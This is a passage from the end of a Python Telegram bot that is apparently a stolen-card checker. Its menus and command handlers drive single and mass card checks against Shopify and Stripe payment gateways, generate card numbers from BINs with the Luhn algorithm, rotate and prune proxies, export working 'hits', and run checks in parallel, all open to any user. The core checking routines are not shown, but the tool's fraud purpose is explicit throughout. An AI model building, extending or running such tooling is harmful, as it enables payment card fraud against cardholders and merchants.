        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
    except:
        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)

@bot.message_handler(commands=['mode'])
def mode_command(message):
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("🐢 SAFE ─ 1 card at a time", callback_data="mode_seguro"),
        InlineKeyboardButton("⚡ FAST ─ 3 cards parallel", callback_data="mode_rapido"),
        InlineKeyboardButton("🚀 EXTREME ─ 5 cards parallel", callback_data="mode_extremo")
    )
    current_mode_text = {
        "seguro": "🐢 SAFE",
        "rapido": "⚡ FAST",
        "extremo": "🚀 EXTREME"
    }
    bot.reply_to(message, f"""🎮 *{BOT_NAME} ─ MODE SELECT*
{LINE_DASH}

🔄 *Current:* {current_mode_text.get(current_mode, 'FAST')} ({PARALLEL_WORKERS}x)

🔽 *Select parallel mode:*""", 
                 parse_mode='Markdown', reply_markup=markup)

# ============================================
# CALLBACKS
# ============================================

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    global current_max_workers, mass_check_running, stripe_mass_running, stop_mass_flag, current_mode, PARALLEL_WORKERS, last_dead_proxies, mass_paused
    
    if call.data == "check":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "📝 /chk cc|mm|yy|cvv")
    
    elif call.data == "mass":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "/mass")
    
    elif call.data == "stripe_check":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "🔓 /au cc|mm|yy|cvv")
    
    elif call.data == "stripe_mass":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "/mau")
    
    elif call.data == "stats":
        bot.answer_callback_query(call.id)
        show_stats(call.message)
    
    elif call.data == "hits":
        bot.answer_callback_query(call.id)
        hits_command(call.message)
    
    elif call.data == "stripe_hits":
        bot.answer_callback_query(call.id)
        stripe_hits_command(call.message)
    
    elif call.data == "sites":
        bot.answer_callback_query(call.id)
        list_sites_command(call.message)
    
    elif call.data == "proxies":
        bot.answer_callback_query(call.id)
        proxies = load_proxies()
        if not proxies:
            bot.send_message(call.message.chat.id, "❌ No proxies saved")
            return
        response = f"📡 *{BOT_NAME} ─ PROXIES ({len(proxies)})*\n{LINE_DASH}\n\n"
        for i, proxy in enumerate(proxies[:30], 1):
            parts = proxy.split(':')
            masked = f"{parts[0]}:{parts[1]}"
            if len(parts) >= 4:
                masked += ":****:****"
            response += f"  {i}. `{masked}`\n"
        response += f"\n{LINE_THIN}\n💡 Use `/delproxy <number>` to delete a proxy"
        safe_send_message(call.message.chat.id, response, parse_mode='Markdown')
    
    elif call.data == "px":
        bot.answer_callback_query(call.id)
        proxy_check_command(call.message)
    
    elif call.data == "bin_lookup":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "🏦 Send BIN number:\n/bin `424242`", parse_mode='Markdown')
    
    elif call.data == "gen_cards":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "🎲 Generate cards with Luhn:\n/gen `424242` `10`\n\nFormat: /gen BIN [amount]", parse_mode='Markdown')
    
    elif call.data == "export":
        bot.answer_callback_query(call.id)
        cards = get_all_cards()
        if not cards:
            bot.send_message(call.message.chat.id, "❌ No Shopify cards to export")
            return
        content = "\n".join(cards)
        file_data = BytesIO(content.encode('utf-8'))
        file_data.name = f"cards_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        bot.send_document(call.message.chat.id, file_data, caption=f"💳 {len(cards)} Shopify cards")
    
    elif call.data == "clear_menu":
        shopify_count = len(get_all_cards())
        stripe_count = len(get_all_stripe_cards())
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton(f"🛒 Delete Shopify Cards ({shopify_count})", callback_data="confirm_clear_shopify"),
            InlineKeyboardButton(f"🔓 Delete Stripe Auth Cards ({stripe_count})", callback_data="confirm_clear_stripe"),
            InlineKeyboardButton("↩️ Cancel", callback_data="cancel_clear")
        )
        try:
            bot.edit_message_text(f"""⚠️ *{BOT_NAME} ─ DELETE CARDS*
{LINE_DASH}

🛒 Shopify: *{shopify_count}* cards
🔓 Stripe Auth: *{stripe_count}* cards

🔽 *Select which cards to delete:*""", 
                                chat_id=call.message.chat.id, message_id=call.message.message_id,
                                parse_mode='Markdown', reply_markup=markup)
        except:
            pass
        bot.answer_callback_query(call.id)
    
    elif call.data == "confirm_clear_shopify":
        count = len(get_all_cards())
        clear_cards()
        bot.answer_callback_query(call.id, f"✅ {count} Shopify cards deleted")
        try:
            bot.edit_message_text(f"🗑️ *{count} Shopify cards deleted*\n{LINE_THIN}\n🛒 Shopify queue is now empty", 
                                chat_id=call.message.chat.id, message_id=call.message.message_id,
                                parse_mode='Markdown')
        except:
            pass
    
    elif call.data == "confirm_clear_stripe":
        count = len(get_all_stripe_cards())
        clear_stripe_cards()
        bot.answer_callback_query(call.id, f"✅ {count} Stripe Auth cards deleted")
        try:
            bot.edit_message_text(f"🗑️ *{count} Stripe Auth cards deleted*\n{LINE_THIN}\n🔓 Stripe Auth queue is now empty", 
                                chat_id=call.message.chat.id, message_id=call.message.message_id,
                                parse_mode='Markdown')
        except:
            pass
    
    elif call.data == "cancel_clear":
        bot.answer_callback_query(call.id, "Cancelled")
        try:
            bot.edit_message_text(f"↩️ *Operation cancelled*\n{LINE_THIN}\nNo cards were deleted", 
                                chat_id=call.message.chat.id, message_id=call.message.message_id,
                                parse_mode='Markdown')
        except:
            pass
    
    elif call.data == "stop_mass":
        if mass_check_running or stripe_mass_running:
            stop_mass_flag = True
            mass_check_running = False
            stripe_mass_running = False
            bot.answer_callback_query(call.id, "✅ Stopping...")
        else:
            bot.answer_callback_query(call.id, "No active mass check")
    
    elif call.data == "fix_sites":
        bot.answer_callback_query(call.id)
        old_count = len(load_sites())
        new_count = fix_all_sites()
        bot.send_message(call.message.chat.id, f"🔧 *Sites Repaired*\n{LINE_THIN}\n📊 Before: *{old_count}*\n📊 After: *{new_count}*", parse_mode='Markdown')
    
    elif call.data == "permanent_sites":
        bot.answer_callback_query(call.id)
        permanent = sqlite_backup.get_permanent_sites()
        if not permanent:
            bot.send_message(call.message.chat.id, "🔒 No permanent sites yet.")
            return
        response = f"🔒 *{BOT_NAME} ─ PERMANENT SITES ({len(permanent)})*\n{LINE_DASH}\n\n"
        for i, site in enumerate(permanent[:20], 1):
            response += f"  {i}. `{site['url']}`\n     └─ ✅ Success: *{site['success_count']}*\n"
        safe_send_message(call.message.chat.id, response, parse_mode='Markdown')
    
    elif call.data == "mode_menu":
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton("🐢 SAFE ─ 1 card at a time", callback_data="mode_seguro"),
            InlineKeyboardButton("⚡ FAST ─ 3 cards parallel", callback_data="mode_rapido"),
            InlineKeyboardButton("🚀 EXTREME ─ 5 cards parallel", callback_data="mode_extremo")
        )
        try:
            bot.edit_message_text(f"""🎮 *{BOT_NAME} ─ MODE SELECT*
{LINE_DASH}

🔄 *Current:* {current_mode} ({PARALLEL_WORKERS}x)

🔽 *Select parallel mode:*""", 
                                chat_id=call.message.chat.id, message_id=call.message.message_id,
                                parse_mode='Markdown', reply_markup=markup)
        except:
            pass
        bot.answer_callback_query(call.id)
    
    elif call.data == "mode_seguro":
        current_mode = "seguro"
        PARALLEL_WORKERS = 1
        bot.answer_callback_query(call.id, "✅ SAFE mode activated")
        try:
            bot.edit_message_text(f"🐢 *SAFE mode activated*\n{LINE_THIN}\n⚙️ Parallel workers: *1x*", chat_id=call.message.chat.id, 
                                message_id=call.message.message_id, parse_mode='Markdown')
        except:
            pass
    
    elif call.data == "mode_rapido":
        current_mode = "rapido"
        PARALLEL_WORKERS = 3
        bot.answer_callback_query(call.id, "✅ FAST mode activated")
        try:
            bot.edit_message_text(f"⚡ *FAST mode activated*\n{LINE_THIN}\n⚙️ Parallel workers: *3x*", chat_id=call.message.chat.id, 
                                message_id=call.message.message_id, parse_mode='Markdown')
        except:
            pass
    
    elif call.data == "mode_extremo":
        current_mode = "extremo"
        PARALLEL_WORKERS = 5
        bot.answer_callback_query(call.id, "✅ EXTREME mode activated")
        try:
            bot.edit_message_text(f"🚀 *EXTREME mode activated*\n{LINE_THIN}\n⚙️ Parallel workers: *5x*", chat_id=call.message.chat.id, 
                                message_id=call.message.message_id, parse_mode='Markdown')
        except:
            pass
    
    elif call.data == "setworkers_menu":
        markup = InlineKeyboardMarkup(row_width=5)
        markup.add(
            InlineKeyboardButton("1️⃣", callback_data="set_workers_1"),
            InlineKeyboardButton("2️⃣", callback_data="set_workers_2"),
            InlineKeyboardButton("3️⃣", callback_data="set_workers_3"),
            InlineKeyboardButton("4️⃣", callback_data="set_workers_4"),
            InlineKeyboardButton("5️⃣", callback_data="set_workers_5")
        )
        try:
            bot.edit_message_text(f"""⚙️ *{BOT_NAME} ─ WORKERS*
{LINE_DASH}

👷 *Current:* {current_max_workers} workers

🔽 *Select workers count:*""", 
                                chat_id=call.message.chat.id, message_id=call.message.message_id,
                                parse_mode='Markdown', reply_markup=markup)
        except:
            pass
        bot.answer_callback_query(call.id)
    
    elif call.data.startswith("set_workers_"):
        try:
            new_workers = int(call.data.replace("set_workers_", ""))
            current_max_workers = new_workers
            bot.answer_callback_query(call.id, f"✅ Workers: {current_max_workers}")
            try:
                bot.edit_message_text(f"✅ *Workers updated to {current_max_workers}*\n{LINE_THIN}\n👷 Active workers: *{current_max_workers}*", 
                                    chat_id=call.message.chat.id, message_id=call.message.message_id,
                                    parse_mode='Markdown')
            except:
                pass
        except:
            bot.answer_callback_query(call.id, "Error")
    
    elif call.data == "delete_dead_proxies":
        if last_dead_proxies:
            count = delete_dead_proxies(last_dead_proxies)
            remaining = len(load_proxies())
            bot.answer_callback_query(call.id, f"✅ {count} dead proxies deleted")
            try:
                bot.edit_message_text(f"🗑️ *{count} dead proxies deleted*\n{LINE_THIN}\n📡 Remaining proxies: *{remaining}*", 
                                    chat_id=call.message.chat.id, message_id=call.message.message_id,
                                    parse_mode='Markdown')
            except:
                pass
            last_dead_proxies = []
        else:
            bot.answer_callback_query(call.id, "No dead proxies to delete")
    
    elif call.data == "help":
        help_text = f"""❓ *{BOT_NAME} {BOT_VERSION}*
{LINE_DASH}
📖 *COMMAND REFERENCE*

🛒 *━━ SHOPIFY GATEWAY ━━*
  /chk `cc|mm|yy|cvv` ─ Single check
  /mass ─ Mass check (pipeline)
  /clearshopify ─ Delete cards
  /hits ─ View hits

🔓 *━━ STRIPE AUTH (FREE) ━━*
  /au `cc|mm|yy|cvv` ─ Single check
  /mau ─ Mass check (pipeline)
  /clearau ─ Delete cards
  /auhits ─ View hits

🏦 *━━ UTILITIES ━━*
  /bin `424242` ─ BIN lookup
  /gen `424242` `10` ─ Generate cards (Luhn)
  /px ─ Deep proxy check (3 levels)
  /delproxy ─ Delete proxy

⚙️ *━━ SETTINGS ━━*
  /stats ─ Statistics panel
  /mode ─ Parallel mode (1x/3x/5x)

📂 *━━ FILE UPLOAD ━━*
  Send `.txt` file → auto-load
  Name with "au"/"stripe" → Stripe Auth

🧹 *━━ AUTO-MAINTENANCE ━━*
  Dead sites auto-cleaned every 50 checks
  Smart site rotation (best sites first)
{LINE_THIN}
🤖 {BOT_NAME} {BOT_VERSION}"""
        try:
            bot.edit_message_text(help_text, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='Markdown')
        except:
            pass
        bot.answer_callback_query(call.id)
    
    else:
        bot.answer_callback_query(call.id)

# ============================================
# START BOT
# ============================================
if __name__ == "__main__":
    print("\n" + "═" * 60)
    print(f"  🤖 {BOT_NAME} {BOT_VERSION} + STRIPE AUTH")
    print(f"  🚀 PARALLEL PIPELINE MODE")
    print("═" * 60)
    print(f"  🌐 Public mode: ALL USERS")
    print(f"  🛒 Shopify cards: {len(get_all_cards())}")
    print(f"  🔓 Stripe Auth cards: {len(get_all_stripe_cards())}")
    print(f"  🌐 Sites: {len(load_sites())}")
    print(f"  📡 Proxies: {len(load_proxies())}")
    print(f"  🎮 Mode: {current_mode} ({PARALLEL_WORKERS}x)")
    print("─" * 60)
    print("  COMMANDS:")
    print("    /mass  ─ Shopify mass check")
    print("    /mau   ─ Stripe Auth mass check (FREE)")
    print("    /px    ─ Check proxies")
    print("    /stats ─ Statistics")
    print("─" * 60)
    print("  🌐 BOT IS PUBLIC - All users can use")
    print("═" * 60 + "\n")
    
    start_silent_pc()
    
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=30)
        except Exception as e:
            time.sleep(5)
